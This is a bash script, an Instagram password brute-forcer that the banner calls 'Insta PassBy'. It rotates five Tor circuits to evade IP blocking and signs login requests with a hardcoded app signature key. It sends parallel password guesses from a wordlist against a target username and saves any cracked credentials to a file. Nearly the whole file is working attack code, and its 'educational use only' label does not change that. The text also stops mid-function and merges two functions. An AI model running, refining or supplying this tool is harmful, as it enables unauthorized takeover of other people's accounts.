#!/usr/bin/env bash
#Instagram: @Jmslgsc
#Credit: github.com/Jmslgsc

# Removed accidental Python import and invalid wrap call; this is a bash script.

counter=0
counter2=20
counter3=40
counter4=60
counter5=80
start=0
end=20
turn=$((start+end))
startline=1
endline=20
sumstart=0
string4=$(openssl rand -hex 32 | cut -c 1-4)
string8=$(openssl rand -hex 32  | cut -c 1-8)
string12=$(openssl rand -hex 32 | cut -c 1-12)
string16=$(openssl rand -hex 32 | cut -c 1-16)
device="android-$string16"
uuid=$(openssl rand -hex 32 | cut -c 1-32)
phone="$string8-$string4-$string4-$string4-$string12"
guid="$string8-$string4-$string4-$string4-$string12"

# define a default header for the initial token fetch (header is undefined later inside functions)
header='User-Agent: Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)'

# fetch headers to extract csrftoken (do not redirect to /dev/null so we can read the response),
# use a plain curl here because Tor may not be started yet; token extraction is made robust.
curl_wrapper() {
  # centralized curl options: timeouts, silent, retries handled here
  # usage: curl_wrapper <extra-args...>
  # example: curl_wrapper --socks5-hostname "127.0.0.1:9051" -d "..." -H "$header" "https://..."
  local retries=2
  local delay=1
  local exit_code=0
  for i in $(seq 0 "$retries"); do
    if curl --max-time 15 "$@"; then
      exit_code=0
      break
    else
      exit_code=$?
      sleep "$delay"
      delay=$((delay * 2))
    fi
  done
  return $exit_code
}

var0=$(curl -i -s -H "$header" "https://i.instagram.com/api/v1/si/fetch_headers/?challenge_type=signup&guid=$uuid")
var2=$(echo "$var0" | grep -o 'csrftoken=[^;]*' | cut -d '=' -f2 || true)
var2=${var2:-}

banner() {
  # Neon/ hacker style boxed banner for "INSTA PASSBY"
  printf "\n"
  printf "\e[1;95m+------------------------------------------------------------+\e[0m\n"
  printf "\e[1;95m|                                                            |\e[0m\n"
  printf "\e[1;95m|  \e[1;91m\e[5m           \e[1;97mINSTA PASSBY\e[1;91m\e[25m  Git:Jmslgsc           \e[1;95m|\e[0m\n"
  printf "\e[1;95m|                                                            |\e[0m\n"
  printf "\e[1;95m+------------------------------------------------------------+\e[0m\n"
  printf "\n"
  printf "\e[1;77m\e[41m  Insta PassBy — For security research / educational use only  \e[0m\n"
  printf "\n"
  printf "\e[1;97mInstagram Brute Forcer v1.0, Author: @Jmslgsc (Github/IG)\e[0m\n" #Don't change, give credit to the authorfunction start() {
read -p $'\e[1;92mUsername account: \e[0m' user
if [[ -z "$user" ]]; then
  printf "\e[1;91mUsername cannot be empty! Try again\e[0m\n"
  sleep 1
start
  return
fi
# check common messages for non-existing profile (case-insensitive, more robust)
checkaccount=$(curl -L -s "https://www.instagram.com/${user}/" | grep -i -E -c "the page may have been removed|sorry, this page isn't available|page not found")
if [[ "$checkaccount" -gt 0 ]]; then
  printf "\e[1;91mInvalid Username! Try again\e[0m\n"
  sleep 1
  start
else
  # default to a single sensible wordlist filename (script expects a single file path)
  default_wl_pass="rockyou.txt"
  read -p $'\e[1;92mPassword List (Enter to default list): \e[0m' wl_pass
  wl_pass="${wl_pass:-${default_wl_pass}}"
  # prompt for threads (use default if empty)
  default_threads="100"
  read -p $'\e[1;92mThreads (Enter to default 100): \e[0m' threads_input
  threads="${threads_input:-${default_threads}}"
fi
}


checkroot() {
if [ "$(id -u)" -ne 0 ]; then
    printf "\e[1;77mPlease, run this program as root!\n\e[0m"
    if command -v sudo >/dev/null 2>&1; then
        printf "\e[1;92mAttempting to re-run with sudo...\n\e[0m"
        exec sudo bash "$0" "$@"
    else
        printf "\e[1;91m'sudo' not found. Re-run this script as root.\n\e[0m"
        exit 1
    fi
fi
}


dependencies() {

# list required commands here
required_cmds="tor curl openssl awk sed cat tr wc cut uniq"

for cmd in $required_cmds; do
  if ! command -v "$cmd" > /dev/null 2>&1; then
    printf >&2 "I require %s but it's not installed. Run ./install.sh. Aborting.\n" "$cmd"
    exit 1
  fi
done

# ensure /dev/urandom exists and is readable (more robust than the previous ls-based check)
if [ ! -r /dev/urandom ]; then
  printf >&2 "/dev/urandom not found or not readable!\n"
  exit 1
fi

}


multitor() {

if [[ ! -d multitor ]]; then
mkdir -p multitor;
printf "SOCKSPort 9051\nDataDirectory /var/lib/tor1\n" > multitor/multitor1
printf "SOCKSPort 9052\nDataDirectory /var/lib/tor2\n" > multitor/multitor2
printf "SOCKSPort 9053\nDataDirectory /var/lib/tor3\n" > multitor/multitor3
printf "SOCKSPort 9054\nDataDirectory /var/lib/tor4\n" > multitor/multitor4
printf "SOCKSPort 9055\nDataDirectory /var/lib/tor5\n" > multitor/multitor5
fi

printf "\e[1;92m[*] Starting Tor on port:\e[0m\e[1;77m 9051\e[0m\n"
tor -f multitor/multitor1 > /dev/null &
tor1=$!
sleep 6
printf "\e[1;92m[*] Starting Tor on port:\e[0m\e[1;77m 9052\e[0m\n"
tor -f multitor/multitor2 > /dev/null & 
tor2=$!
sleep 6
printf "\e[1;92m[*] Starting Tor on port:\e[0m\e[1;77m 9053\e[0m\n"
tor -f multitor/multitor3 > /dev/null &
tor3=$!
sleep 6
printf "\e[1;92m[*] Starting Tor on port:\e[0m\e[1;77m 9054\e[0m\n"
tor -f multitor/multitor4 > /dev/null &
tor4=$!
sleep 6
printf "\e[1;92m[*] Starting Tor on port:\e[0m\e[1;77m 9055\e[0m\n"
tor -f multitor/multitor5 > /dev/null &
tor5=$!
sleep 6

checkcount=0

for port in 9051 9052 9053 9054 9055; do
  printf "\e[1;92m[*] Checking Tor connection on port:\e[0m\e[1;77m %s\e[0m..." "$port"
  # use curl_wrapper for consistent options; suppress output and return status
  if curl_wrapper --socks5-hostname "localhost:${port}" -s https://www.google.com > /dev/null; then
    check=0
  else
    check=$?
  fi
  if [[ "$check" -gt 0 ]]; then
    printf "\e[1;91mFAIL!\e[0m\n"
  else
    printf "\e[1;92mOK!\e[0m\n"
    checkcount=$((checkcount+1))
  fi
done

if [[ "$checkcount" -ne 5 ]]; then
printf "\e[1;91mRequire all TOR connection running to continue. Exiting\e[0m\n"
exit 1
fi
printf "\n"
printf "\e[1;77m[*] Starting...\e[0m\n"
printf "\e[1;91m [*] Press Crtl + C to Stop/Save session\e[0m\n"
sleep 2
}

function store() {

if [[ -n "$threads" ]]; then
printf "\n"
printf "\e[1;91m [*] Waiting threads shutting down...\n\e[0m"
wait "${pid1:-}" > /dev/null 2>&1 ; wait "${pid2:-}" > /dev/null 2>&1 ; wait "${pid3:-}" > /dev/null 2>&1 ; wait "${pid4:-}" > /dev/null 2>&1 ; wait "$!" > /dev/null 2>&1
sleep 6

if [[ -e "rockyou.txt" ]]; then
not=$(wc -l < "rockyou.txt" 2>/dev/null || echo 0)
printf "\e[1;92m [!] Passwords not tested due IP BLocking:\e[0m\e[1;77m %s\e[0m\n" "$not"
ssfile="nottested.$user.$RANDOM"
if mv "rockyou.txt" "$ssfile" 2>/dev/null; then
  sfile="$ssfile"
  printf "\e[1;92m [*] Saved:\e[0m\e[1;77m %s\n" "$sfile"
  printf "\e[1;91m [!] Use this file as wordlist!\e[0m\n"
else
  printf "\e[1;91m [!] Failed to move rockyou.txt to %s\e[0m\n" "$ssfile"
fi
fi
default_session="Y"
printf "\n\e[1;77m [?] Save session for user\e[0m\e[1;92m %s \e[0m" "$user"
read -p $'\e[1;77m? [Y/n]: \e[0m' session
session="${session:-${default_session}}"
if [[ "$session" == "Y" || "$session" == "y" || "$session" == "yes" || "$session" == "Yes" ]]; then
if [[ ! -d "sessions" ]]; then
mkdir -p "sessions"
fi
IFS=$'\n'
countpass=$(grep -n -x -- "$pass" "$wl_pass" 2>/dev/null | cut -d ":" -f1 | head -n1 || true)
printf "user=\"%s\"\npass=\"%s\"\nwl_pass=\"%s\"\ntoken=\"%s\"\n" "$user" "$pass" "$wl_pass" "$countpass" > "sessions/store.session.$user.$(date +"%FT%H%M")"
printf "\e[1;77mSession saved.\e[0m\n"
printf "\e[1;92mUse ./instainsane.sh --resume\n"
else
exit 1
fi
else
exit 1
fi
}


# --- SAFE bf1 for learning/testing (fixed loop structure) ---
bf1() {
  while [ "$counter" -lt "$turn" ]; do
    count_pass=$(wc -l "$wl_pass" 2>/dev/null | awk '{print $1}')
    IFS=$'\n'

    # Read passwords line by line from a specific range
    while IFS= read -r pass; do
      countpass=$(grep -n -x -- "$pass" "$wl_pass" 2>/dev/null | cut -d ":" -f1)
      (
        try_password "9051" "$pass" "$countpass" "$count_pass"
      ) &
      let counter++
    done < <(sed -n "${startline},${endline}p" "$wl_pass")

    pid1=$!
    let startline+=20
    let endline+=20
  done
}
# --- end safe bf1 ---


try_password() {
  local port="$1"
  local pass="$2"
  local countpass="$3"
  local count_pass="$4"

  printf "\e[1;77mTrying pass (%s/%s)\e[0m: \"%s\"\n" "$countpass" "$count_pass" "$pass"

  header='Connection: "close", "Accept": "*/*", "Content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Cookie2": "$Version=1" "Accept-Language": "en-US", "User-Agent": "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'
  data='{"phone_id":"'"$phone"'", "_csrftoken":"'"$var2"'", "username":"'"$user"'", "guid":"'"$guid"'", "device_id":"'"$device"'", "password":"'"$pass"'", "login_attempt_count":"0"}'
  ig_sig="4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178"
  hmac=$(printf '%s' "$data" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2)
  useragent='User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'

  trap '' SIGINT
  response=$(curl_wrapper --socks5-hostname "127.0.0.1:$port" -d "ig_sig_key_version=4&signed_body=$hmac.$data" --user-agent "$useragent" -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" 2>/dev/null) || true
    
  var=$(echo "$response" | grep -o "logged_in_user\|challenge\|many tries\|Please wait" | uniq)
  http_code=$(echo "$response" | tail -n1)

  if [[ "$var" == "challenge" ]]; then
    printf "\e[1;92m \n [*] Password Found: %s\n [*] Challenge required\n" "$pass"
    printf "Username: %s, Password: %s\n" "$user" "$pass" >> found.instainsane
    printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instainsane \n\e[0m"
    rm -f rockyou.txt
    kill -1 $$ > /dev/null 2>&1
  elif [[ "$var" == "logged_in_user" ]]; then
    printf "\e[1;92m \n [*] Password Found: %s\n" "$pass"
    printf "Username: %s, Password: %s\n" "$user" "$pass" >> found.instainsane
    printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instainsane \n\e[0m"
    rm -f rockyou.txt
    kill -1 $$ > /dev/null 2>&1
  elif [[ "$http_code" == "429" ]]; then
    printf "\e[1;91m [!] Rate limit hit, waiting...\e[0m\n"
    sleep 3
    printf '%s\n' "$pass" >> rockyou.txt
  elif [[ "$var" == "Please wait" || -z "$var" ]]; then
    printf '%s\n' "$pass" >> rockyou.txt
  fi
}

bf2() {
  while [ "$counter2" -lt "$turn" ]; do
    count_pass=$(wc -l "$wl_pass" 2>/dev/null | awk '{print $1}')
    IFS=$'\n'
    while IFS= read -r pass; do
      countpass=$(grep -n -x -- "$pass" "$wl_pass" 2>/dev/null | cut -d ":" -f1)
      (
        try_password "9052" "$pass" "$countpass" "$count_pass"
      ) &
      let counter2++
    done < <(sed -n "${startline},${endline}p" "$wl_pass")
    pid2=$!
    let startline+=20
    let endline+=20
  done
}


bf3() {

while [ "$counter3" -lt "$turn" ]; do
count_pass=$(wc -l "$wl_pass" 2>/dev/null | awk '{print $1}')
IFS=$'\n'
while IFS= read -r pass; do
header='Connection: "close", "Accept": "*/*", "Content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Cookie2": "$Version=1" "Accept-Language": "en-US", "User-Agent": "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'

data='{"phone_id":"'"$phone"'", "_csrftoken":"'"$var2"'", "username":"'"$user"'", "guid":"'"$guid"'", "device_id":"'"$device"'", "password":"'"$pass"'", "login_attempt_count":"0"}'
ig_sig="4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178"
IFS=$'\n'
countpass=$(grep -n -x -- "$pass" "$wl_pass" 2>/dev/null | cut -d ":" -f1)
hmac=$(printf '%s' "$data" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2)
useragent='User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'

let counter3++

printf "\e[1;77mTrying pass (%s/%s)\e[0m: \"%s\"\n" "$countpass" "$count_pass" "$pass"

(
  trap '' SIGINT
  var=$(curl_wrapper --socks5-hostname 127.0.0.1:9053 -d "ig_sig_key_version=4&signed_body=$hmac.$data" --user-agent "$useragent" -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" 2>/dev/null | grep -o "logged_in_user\|challenge\|many tries\|Please wait" | uniq)
  if [[ "$var" == "challenge" ]]; then
    printf "\e[1;92m \n [*] Password Found: %s\n [*] Challenge required\n" "$pass"
    printf "Username: %s, Password: %s\n" "$user" "$pass" >> found.instainsane
    printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instainsane \n\e[0m"
    rm -f rockyou.txt
    kill -1 $$ > /dev/null 2>&1
  elif [[ "$var" == "logged_in_user" ]]; then
    printf "\e[1;92m \n [*] Password Found: %s\n" "$pass"
    printf "Username: %s, Password: %s\n" "$user" "$pass" >> found.instainsane
    printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instainsane \n\e[0m"
    rm -f rockyou.txt
    kill -1 $$ > /dev/null 2>&1
  elif [[ "$var" == "Please wait" || -z "$var" ]]; then
    printf '%s\n' "$pass" >> rockyou.txt
  fi
  ) &
    done < <(sed -n ''$((startline+sumstart))','$endline'p' "$wl_pass")
pid3=$!

let startline+=20
let endline+=20

done
}


bf4() {

count_pass=$(wc -l "$wl_pass" 2>/dev/null | awk '{print $1}')
while [ "$counter4" -lt "$turn" ]; do

IFS=$'\n'
while IFS= read -r pass; do
header='Connection: "close", "Accept": "*/*", "Content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Cookie2": "$Version=1" "Accept-Language": "en-US", "User-Agent": "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'

data='{"phone_id":"'"$phone"'", "_csrftoken":"'"$var2"'", "username":"'"$user"'", "guid":"'"$guid"'", "device_id":"'"$device"'", "password":"'"$pass"'", "login_attempt_count":"0"}'
ig_sig="4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178"
IFS=$'\n'
countpass=$(grep -n -x -- "$pass" "$wl_pass" 2>/dev/null | cut -d ":" -f1)
hmac=$(printf '%s' "$data" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2)
useragent='User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'


let counter4++
printf "\e[1;77mTrying pass (%s/%s)\e[0m: \"%s\"\n" "$countpass" "$count_pass" "$pass"

(
  trap '' SIGINT
  var=$(curl_wrapper --socks5-hostname 127.0.0.1:9054 -d "ig_sig_key_version=4&signed_body=$hmac.$data" --user-agent "$useragent" -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" 2>/dev/null | grep -o "logged_in_user\|challenge\|many tries\|Please wait" | uniq)
  if [[ "$var" == "challenge" ]]; then
    printf "\e[1;92m \n [*] Password Found: %s\n [*] Challenge required\n" "$pass"
    printf "Username: %s, Password: %s\n" "$user" "$pass" >> found.instainsane
    printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instainsane \n\e[0m"
    rm -f rockyou.txt
    kill -1 $$ > /dev/null 2>&1
  elif [[ "$var" == "logged_in_user" ]]; then
    printf "\e[1;92m \n [*] Password Found: %s\n" "$pass"
    printf "Username: %s, Password: %s\n" "$user" "$pass" >> found.instainsane
    printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instainsane \n\e[0m"
    rm -f rockyou.txt
    kill -1 $$ > /dev/null 2>&1
  elif [[ "$var" == "Please wait" || -z "$var" ]]; then
    printf '%s\n' "$pass" >> rockyou.txt
  fi
  ) &
    done < <(sed -n ''$((startline+sumstart))','$endline'p' "$wl_pass")
pid4=$!

let startline+=20
let endline+=20

done
}

bf5() {

while [ "$counter5" -lt "$turn" ]; do
count_pass=$(wc -l "$wl_pass" 2>/dev/null | awk '{print $1}')
IFS=$'\n'
while IFS= read -r pass; do
header='Connection: "close", "Accept": "*/*", "Content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Cookie2": "$Version=1" "Accept-Language": "en-US", "User-Agent": "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'

data='{"phone_id":"'"$phone"'", "_csrftoken":"'"$var2"'", "username":"'"$user"'", "guid":"'"$guid"'", "device_id":"'"$device"'", "password":"'"$pass"'", "login_attempt_count":"0"}'
ig_sig="4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178"
IFS=$'\n'
countpass=$(grep -n -x -- "$pass" "$wl_pass" 2>/dev/null | cut -d ":" -f1)
hmac=$(printf '%s' "$data" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2)
useragent='User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'

let counter5++

printf "\e[1;77mTrying pass (%s/%s)\e[0m: \"%s\"\n" "$countpass" "$count_pass" "$pass"

(
  trap '' SIGINT
  var=$(curl_wrapper --socks5-hostname 127.0.0.1:9055 -d "ig_sig_key_version=4&signed_body=$hmac.$data" --user-agent "$useragent" -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" 2>/dev/null | grep -o "logged_in_user\|challenge\|many tries\|Please wait" | uniq)
  if [[ "$var" == "challenge" ]]; then
    printf "\e[1;92m \n [*] Password Found: %s\n [*] Challenge required\n" "$pass"
    printf "Username: %s, Password: %s\n" "$user" "$pass" >> found.instainsane
    printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instainsane \n\e[0m"
    rm -f rockyou.txt
    kill -1 $$ > /dev/null 2>&1
  elif [[ "$var" == "logged_in_user" ]]; then
    printf "\e[1;92m \n [*] Password Found: %s\n" "$pass"
    printf "Username: %s, Password: %s\n" "$user" "$pass" >> found.instainsane
    printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instainsane \n\e[0m"
    rm -f rockyou.txt
    kill -1 $$ > /dev/null 2>&1
  elif [[ "$var" == "Please wait" || -z "$var" ]]; then
    printf '%s\n' "$pass" >> rockyou.txt
  fi
  ) &
    done < <(sed -n ''$((startline+sumstart))','$endline'p' "$wl_pass")
# wait for background workers from other functions to finish before proceeding
wait $pid1 > /dev/null 2>&1 || true
wait $pid2 > /dev/null 2>&1 || true
wait $pid3 > /dev/null 2>&1 || true
wait $pid4 > /dev/null 2>&1 || true
wait $! > /dev/null 2>&1 || true

let startline+=20
let endline+=20

done
}


bf1resume() {

while [ "$counter" -lt "$turn" ]; do
startresume=$(grep -n -x "$pass" "$wl_pass" | cut -d ":" -f1) 
startresume1=$((startresume+1))
IFS=$'\n'
while IFS= read -r pass; do

count_pass=$(wc -l $wl_pass | cut -d " " -f1)
header='Connection: "close", "Accept": "*/*", "Content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Cookie2": "$Version=1" "Accept-Language": "en-US", "User-Agent": "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'

data='{"phone_id":"'$phone'", "_csrftoken":"'$var2'", "username":"'$user'", "guid":"'$guid'", "device_id":"'$device'", "password":"'$pass'", "login_attempt_count":"0"}'
ig_sig="4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178"
IFS=$'\n'
countpass=$(grep -n -x "$pass" "$wl_pass" | cut -d ":" -f1)
hmac=$(echo -n "$data" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2)
useragent='User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'


let counter++
printf "\e[1;77mTrying pass (%s/%s)\e[0m: \"%s\"\n" "$countpass" "$count_pass" "$pass"

{
  trap '' SIGINT
  var=$(curl_wrapper --socks5-hostname 127.0.0.1:9051 -d "ig_sig_key_version=4&signed_body=$hmac.$data" --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" 2>/dev/null | grep -o "logged_in_user\|challenge\|many tries\|Please wait" | uniq)
  if [[ "$var" == "challenge" ]]; then
    printf "\e[1;92m \n [*] Password Found: %s\n [*] Challenge required\n" "$pass"
    printf "Username: %s, Password: %s\n" "$user" "$pass" >> found.instainsane
    printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instainsane \n\e[0m"
    rm -rf rockyou.txt
    kill -1 $$ > /dev/null 2>&1
  elif [[ "$var" == "logged_in_user" ]]; then
    printf "\e[1;92m \n [*] Password Found: %s\n" "$pass"
    printf "Username: %s, Password: %s\n" "$user" "$pass" >> found.instainsane
    printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instainsane \n\e[0m"
    rm -rf rockyou.txt
    kill -1 $$ > /dev/null 2>&1
  elif [[ "$var" == "Please wait" || -z "$var" ]]; then
    echo "$pass" >> rockyou.txt
  fi
  } &
    done < <(sed -n ''$startresume1','$(($token+endline))'p' $wl_pass)
pid1=$! # background group

let startline+=20
let endline+=20

done
}

bf2resume() {

while [ "$counter2" -lt "$turn" ]; do
count_pass=$(wc -l $wl_pass | cut -d " " -f1)
IFS=$'\n'
startresume=$(grep -n -x "$pass" "$wl_pass" | cut -d ":" -f1)
startresume1=$((startresume+1))
IFS=$'\n'
while IFS= read -r pass; do

header='Connection: "close", "Accept": "*/*", "Content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Cookie2": "$Version=1" "Accept-Language": "en-US", "User-Agent": "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'

data='{"phone_id":"'$phone'", "_csrftoken":"'$var2'", "username":"'$user'", "guid":"'$guid'", "device_id":"'$device'", "password":"'$pass'", "login_attempt_count":"0"}'
ig_sig="4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178"
IFS=$'\n'
countpass=$(grep -n -x "$pass" "$wl_pass" | cut -d ":" -f1)
hmac=$(echo -n "$data" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2)
useragent='User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'

let counter2++

printf "\e[1;77mTrying pass (%s/%s)\e[0m: \"%s\"\n" "$countpass" "$count_pass" "$pass"

{
  trap '' SIGINT
  var=$(curl_wrapper --socks5-hostname 127.0.0.1:9052 -d "ig_sig_key_version=4&signed_body=$hmac.$data" --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" 2>/dev/null | grep -o "logged_in_user\|challenge\|many tries\|Please wait" | uniq)
  if [[ "$var" == "challenge" ]]; then
    printf "\e[1;92m \n [*] Password Found: %s\n [*] Challenge required\n" "$pass"
    printf "Username: %s, Password: %s\n" "$user" "$pass" >> found.instainsane
    printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instainsane \n\e[0m"
    rm -rf rockyou.txt
    kill -1 $$ > /dev/null 2>&1
  elif [[ "$var" == "logged_in_user" ]]; then
    printf "\e[1;92m \n [*] Password Found: %s\n" "$pass"
    printf "Username: %s, Password: %s\n" "$user" "$pass" >> found.instainsane
    printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instainsane \n\e[0m"
    rm -rf rockyou.txt
    kill -1 $$ > /dev/null 2>&1
  elif [[ "$var" == "Please wait" || -z "$var" ]]; then
    echo "$pass" >> rockyou.txt
  fi
  } &
    done < <(sed -n ''$startresume1','$(($token+endline))'p' $wl_pass)
pid2=$! # wait $!

let startline+=20
let endline+=20

done
}

bf3resume() {

while [ "$counter3" -lt "$turn" ]; do
count_pass=$(wc -l $wl_pass | cut -d " " -f1)
IFS=$'\n'
startresume=$(grep -n -x "$pass" "$wl_pass" | cut -d ":" -f1)
startresume1=$((startresume+1))
IFS=$'\n'
while IFS= read -r pass; do

header='Connection: "close", "Accept": "*/*", "Content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Cookie2": "$Version=1" "Accept-Language": "en-US", "User-Agent": "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'

data='{"phone_id":"'$phone'", "_csrftoken":"'$var2'", "username":"'$user'", "guid":"'$guid'", "device_id":"'$device'", "password":"'$pass'", "login_attempt_count":"0"}'
ig_sig="4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178"
IFS=$'\n'
countpass=$(grep -n -x "$pass" "$wl_pass" | cut -d ":" -f1)
hmac=$(echo -n "$data" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2)
useragent='User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'

let counter3++

printf "\e[1;77mTrying pass (%s/%s)\e[0m: \"%s\"\n" "$countpass" "$count_pass" "$pass"

{
  trap '' SIGINT
  var=$(curl_wrapper --socks5-hostname 127.0.0.1:9053 -d "ig_sig_key_version=4&signed_body=$hmac.$data" --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" 2>/dev/null | grep -o "logged_in_user\|challenge\|many tries\|Please wait" | uniq)
  if [[ "$var" == "challenge" ]]; then
    printf "\e[1;92m \n [*] Password Found: %s\n [*] Challenge required\n" "$pass"
    printf "Username: %s, Password: %s\n" "$user" "$pass" >> found.instainsane
    printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instainsane \n\e[0m"
    rm -rf rockyou.txt
    kill -1 $$ > /dev/null 2>&1
  elif [[ "$var" == "logged_in_user" ]]; then
    printf "\e[1;92m \n [*] Password Found: %s\n" "$pass"
    printf "Username: %s, Password: %s\n" "$user" "$pass" >> found.instainsane
    printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instainsane \n\e[0m"
    rm -rf rockyou.txt
    kill -1 $$ > /dev/null 2>&1
  elif [[ "$var" == "Please wait" || -z "$var" ]]; then
    echo "$pass" >> rockyou.txt
  fi
  } &
    done < <(sed -n ''$startresume1','$(($token+endline))'p' $wl_pass)
pid3=$! # wait $!

let startline+=20
let endline+=20

done
}


bf4resume() {

count_pass=$(wc -l "$wl_pass" | awk '{print $1}')
while [ "$counter4" -lt "$turn" ]; do

IFS=$'\n'
startresume=$(grep -n -x "$pass" "$wl_pass" | cut -d ":" -f1)
startresume1=$((startresume+1))
IFS=$'\n'
while IFS= read -r pass; do

header='Connection: "close", "Accept": "*/*", "Content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Cookie2": "$Version=1" "Accept-Language": "en-US", "User-Agent": "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'

data='{"phone_id":"'"$phone"'", "_csrftoken":"'"$var2"'", "username":"'"$user"'", "guid":"'"$guid"'", "device_id":"'"$device"'", "password":"'"$pass"'", "login_attempt_count":"0"}'
ig_sig="4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178"
IFS=$'\n'
countpass=$(grep -n -x "$pass" "$wl_pass" | cut -d ":" -f1)
hmac=$(echo -n "$data" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2)
useragent='User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'


let counter4++
printf "\e[1;77mTrying pass (%s/%s)\e[0m: \"%s\"\n" "$countpass" "$count_pass" "$pass"

(
  trap '' SIGINT
  var=$(curl_wrapper --socks5-hostname 127.0.0.1:9054 -d "ig_sig_key_version=4&signed_body=$hmac.$data" --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" 2>/dev/null | grep -o "logged_in_user\|challenge\|many tries\|Please wait" | uniq)
  if [[ "$var" == "challenge" ]]; then
    printf "\e[1;92m \n [*] Password Found: %s\n [*] Challenge required\n" "$pass"
    printf "Username: %s, Password: %s\n" "$user" "$pass" >> found.instainsane
    printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instainsane \n\e[0m"
    rm -rf rockyou.txt
    kill -1 $$ > /dev/null 2>&1
  elif [[ "$var" == "logged_in_user" ]]; then
    printf "\e[1;92m \n [*] Password Found: %s\n" "$pass"
    printf "Username: %s, Password: %s\n" "$user" "$pass" >> found.instainsane
